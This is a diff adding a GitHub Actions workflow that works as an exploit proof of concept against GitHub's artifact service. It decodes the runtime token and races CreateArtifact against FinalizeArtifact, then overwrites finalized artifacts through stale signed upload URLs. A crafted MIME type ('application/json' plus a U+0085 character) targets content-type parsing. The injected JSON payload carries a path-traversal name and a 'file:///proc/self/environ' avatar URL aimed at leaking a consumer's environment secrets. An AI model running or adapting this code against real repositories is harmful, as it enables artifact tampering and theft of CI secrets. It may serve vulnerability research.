@@ -1,0 +1,132 @@
+name: Repo Cassette late CreateArtifact race
+on:
+  workflow_dispatch:
+  push:
+    branches: [probe-late-create-finalize-race-20261025]
+    paths: [.github/workflows/probe_late_create_finalize_race.yml]
+permissions:
+  actions: read
+  contents: read
+jobs:
+  race:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Race CreateArtifact with finalization and inspect actual downloads
+        uses: actions/github-script@v8
+        env:
+          GH_TOKEN: ${{ github.token }}
+        with:
+          script: |
+            const {createHash} = require('node:crypto');
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            if (!token || !resultsUrl) throw new Error('Actions runtime artifact credentials unavailable');
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
+            if (!scope) throw new Error('Actions.Results scope missing');
+            const [, runBackendId, jobBackendId] = scope.split(':');
+            const service = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
+            const repo = process.env.GITHUB_REPOSITORY;
+            const [owner, namePart] = repo.split('/');
+            const runId = process.env.GITHUB_RUN_ID;
+            const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
+            async function rpc(method, body) {
+              const start = Date.now();
+              const response = await fetch(service + method, {
+                method: 'POST',
+                headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify(body)
+              });
+              const data = await response.json().catch(() => ({}));
+              return {status: response.status, data, ms: Date.now() - start};
+            }
+            async function create(artifactName, version, mime) {
+              const r = await rpc('CreateArtifact', {
+                workflow_run_backend_id: runBackendId,
+                workflow_job_run_backend_id: jobBackendId,
+                name: artifactName,
+                version,
+                mime_type: mime
+              });
+              return {status: r.status, ok: r.data.ok, reason: String(r.data.msg || r.data.code || '').slice(0, 120), ms: r.ms, url: r.data.signed_upload_url || r.data.signedUploadUrl || null};
+            }
+            async function put(url, bytes) {
+              if (!url) return {ok: false, error: 'no upload URL'};
+              try {
+                const response = await fetch(url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2023-11-03', 'Content-Type': 'application/octet-stream'}, body: bytes});
+                return {ok: response.ok, status: response.status};
+              } catch (e) { return {ok: false, error: String(e).slice(0, 100)}; }
+            }
+            async function finalize(artifactName, bytes) {
+              const hash = `sha256:${createHash('sha256').update(bytes).digest('hex')}`;
+              const r = await rpc('FinalizeArtifact', {
+                workflow_run_backend_id: runBackendId,
+                workflow_job_run_backend_id: jobBackendId,
+                name: artifactName,
+                size: String(bytes.length),
+                hash
+              });
+              return {status: r.status, ok: r.data.ok, reason: String(r.data.msg || r.data.code || '').slice(0, 150), id: String(r.data.artifact_id || r.data.artifactId || ''), ms: r.ms};
+            }
+            async function inspect(id, expected) {
+              if (!id) return {error: 'no finalized artifact id'};
+              const response = await fetch(`https://api.github.com/repos/${owner}/${namePart}/actions/artifacts/${id}/zip`, {
+                headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json'},
+                redirect: 'manual'
+              });
+              const location = response.headers.get('location');
+              if (!location) return {apiStatus: response.status, body: (await response.text()).slice(0, 100)};
+              const signed = new URL(location);
+              const downloaded = await fetch(location);
+              const bytes = Buffer.from(await downloaded.arrayBuffer());
+              const type = downloaded.headers.get('content-type') || '';
+              const media = type.split(',', 1)[0].split(';', 1)[0];
+              const py = media.replace(/^[\x09-\x0d\x1c-\x20\x85\xa0]+|[\x09-\x0d\x1c-\x20\x85\xa0]+$/g, '').toLowerCase();
+              let json = false;
+              try { const parsed = JSON.parse(bytes.toString('utf8')); json = !!parsed && typeof parsed.full_name === 'string' && parsed.owner?.avatar_url === 'file:///proc/self/environ'; } catch {}
+              return {apiStatus: response.status, finalStatus: downloaded.status, contentType: type, contentTypeHex: Buffer.from(type, 'latin1').toString('hex'), rsct: signed.searchParams.getAll('rsct'), bytes: bytes.length, sha256: createHash('sha256').update(bytes).digest('hex'), exactPayload: bytes.equals(expected), exploitJson: json, pythonTreatsAsJson: py === 'application/json'};
+            }
+            async function single(label, firstVersion, firstMime, lateVersion, lateMime) {
+              const artifactName = `${runId}-${label}`;
+              const placeholder = Buffer.from('{}');
+              const first = await create(artifactName, firstVersion, firstMime);
+              const firstUpload = await put(first.url, placeholder);
+              const finalized = await finalize(artifactName, placeholder);
+              const late = await create(artifactName, lateVersion, lateMime);
+              const payload = Buffer.from(JSON.stringify({full_name: `x/../${repo}/actions/artifacts/${finalized.id}/zip`, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: label, stargazers_count: 7}));
+              const writes = await Promise.all([put(first.url, payload), put(late.url, payload)]);
+              const download = await inspect(finalized.id, payload);
+              core.info(`LATE_RESULT ${JSON.stringify({label, first: {...first, url: undefined}, firstUpload, finalized, late: {...late, url: undefined}, writes, download})}`);
+            }
+            const odd = 'application/json\u0085';
+            await single('late-v6-after-v7', 7, 'application/json', 6, odd);
+            await single('late-v7-after-v6', 6, odd, 7, 'application/json');
+            const delays = [-120, -60, -25, -10, 0, 10, 25, 60, 120];
+            for (const [direction, preV] of [['v7-then-v6', 7], ['v6-then-v7', 6]]) {
+              for (let i = 0; i < delays.length; i++) {
+                const delay = delays[i];
+                const lateV = preV === 7 ? 6 : 7;
+                const preMime = preV === 7 ? 'application/json' : odd;
+                const lateMime = lateV === 7 ? 'application/json' : odd;
+                const artifactName = `${runId}-${direction}-${i}`;
+                const placeholder = Buffer.from('{}');
+                const pre = await create(artifactName, preV, preMime);
+                const preUpload = await put(pre.url, placeholder);
+                let latePromise, finalPromise;
+                if (delay < 0) {
+                  latePromise = create(artifactName, lateV, lateMime);
+                  await wait(-delay);
+                  finalPromise = finalize(artifactName, placeholder);
+                } else {
+                  finalPromise = finalize(artifactName, placeholder);
+                  await wait(delay);
+                  latePromise = create(artifactName, lateV, lateMime);
+                }
+                const [late, finalized] = await Promise.all([latePromise, finalPromise]);
+                const payload = Buffer.from(JSON.stringify({full_name: `x/../${repo}/actions/artifacts/${finalized.id}/zip`, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: `${direction}-${delay}`, stargazers_count: 7}));
+                const writes = await Promise.all([put(pre.url, payload), put(late.url, payload)]);
+                const download = await inspect(finalized.id, payload);
+                core.info(`RACE_RESULT ${JSON.stringify({direction, delay, pre: {...pre, url: undefined}, preUpload, late: {...late, url: undefined}, finalized, writes, download})}`);
+              }
+            }
